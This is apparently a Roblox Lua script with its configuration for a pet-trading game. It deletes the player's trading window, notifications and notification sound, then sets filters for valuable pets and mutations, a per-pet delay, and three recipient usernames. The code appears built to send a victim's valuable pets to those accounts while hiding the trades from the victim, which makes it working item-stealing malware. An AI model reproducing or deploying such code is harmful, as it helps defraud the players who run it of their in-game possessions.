game:GetService("Players").LocalPlayer.PlayerGui.Trading:Destroy()
game:GetService("Players").LocalPlayer.PlayerGui.Top_Notification:Destroy()
game:GetService("SoundService").Notification:Destroy()

return {
    ENABLE_AGE_FILTER    = true,
    ENABLE_WEIGHT_FILTER = true,
    MIN_AGE              = 50,
    MIN_WEIGHT           = 15,

    ALLOWED_NAMES = {
        ["raccoon"]         = true,
        ["disco bee"]       = true,
        ["butterfly"]       = true,
        ["mimic octopus"]   = true,
        ["dragonfly"]       = true,
        ["chicken zombie"] = true,
        ["fennec fox"] = true,


        ["ascended"] = true,
        ["shiny"] = true,
        ["mega"] = true,
        ["rainbow"]  = true,
        ["inverted"] = true,
    },

    DELAY_BETWEEN_PETS = 0.125,

    RECIPIENT_USERNAMES = {
        ["JobJobJob_JobJobJob"] = true,
        ["1xxxCoolGuyxx1"]      = true,
        ["canyoust0pME"]        = true,
    },

    PET_MUTATIONS = {
        ["ascended"] = false,
        ["rainbow"]  = true,
        ["inverted"] = false
    },
}
